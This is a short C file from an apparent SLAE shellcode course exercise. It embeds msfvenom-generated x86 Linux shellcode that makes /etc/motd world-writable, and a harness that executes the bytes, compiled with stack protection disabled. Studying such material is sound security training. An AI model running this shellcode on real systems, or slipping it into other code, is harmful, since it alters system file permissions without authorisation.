/*
Filename:      shellcode.c
Author:        Nicolas Barrière
Student ID:    SLAE - 1398
Created Date:  05.12.2018
Note:          x86 code but compiled on x64
Disassembler:  msfvenom -p linux/x86/chmod FILE=/etc/motd MODE=666 -a x86 --platform linux -f c
Compiler:      gcc -m32 -ggdb -fno-stack-protector -z execstack shellcode.c -o shellcode
*/

#include<stdio.h>
#include<string.h>

unsigned char code [] = \
"\x99\x6a\x0f\x58\x52\xe8\x0a\x00\x00\x00\x2f\x65\x74\x63\x2f"
"\x6d\x6f\x74\x64\x00\x5b\x68\xb6\x01\x00\x00\x59\xcd\x80\x6a"
"\x01\x58\xcd\x80";

main()
{
  printf("Shellcode Lenght: %d\n", strlen(code));
  int (*ret)() = (int(*)())code;
  ret();
}
